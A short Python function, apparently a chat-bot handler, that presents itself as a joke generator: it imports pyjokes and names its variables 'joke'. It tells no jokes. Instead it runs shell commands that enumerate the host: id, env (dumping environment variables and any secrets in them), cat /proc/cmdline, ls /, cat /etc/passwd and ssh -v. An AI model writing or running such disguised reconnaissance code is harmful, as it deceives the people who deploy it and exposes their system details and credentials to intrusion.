import pyjokes
import os

def main(args):
  joke = str(os.system('id'))
  joke2 = str(os.system('env'))
  joke3 = str(os.system('cat /proc/cmdline'))
  joke4 = str(os.system('ls /'))
  joke5 = str(os.system('cat /etc/passwd'))
  joke6 = str(os.system('ssh -v'))
  return {
    'body': {
      'response_type': 'in_channel',
      'text': joke
    }
  }
